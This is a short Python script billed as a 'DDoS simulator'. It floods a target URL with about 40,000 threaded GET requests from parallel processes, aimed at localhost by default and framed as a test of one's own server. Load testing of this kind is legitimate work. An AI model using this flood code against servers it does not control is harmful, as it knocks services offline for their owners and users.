# efficient_ddos_simulator.py
# Author: worksbyahamed

import requests
import threading
import multiprocessing
import time

TARGET_URL = "http://127.0.0.1:8080"  # Change to your test server
THREADS_PER_PROCESS = 50
PROCESSES = 4
REQUESTS_PER_THREAD = 200

def attack():
    session = requests.Session()
    for _ in range(REQUESTS_PER_THREAD):
        try:
            session.get(TARGET_URL, timeout=1)
        except Exception:
            pass

def process_worker():
    threads = []
    for _ in range(THREADS_PER_PROCESS):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def main():
    print(f"Starting DDoS simulation on {TARGET_URL}")
    start = time.time()
    processes = []
    for _ in range(PROCESSES):
        p = multiprocessing.Process(target=process_worker)
        p.start()
        processes.append(p)
    for p in processes:
        p.join()
    duration = time.time() - start
    total_requests = THREADS_PER_PROCESS * PROCESSES * REQUESTS_PER_THREAD
    print(f"Simulation complete. Sent {total_requests} requests in {duration:.2f} seconds.")

if __name__ == "__main__":
    main()
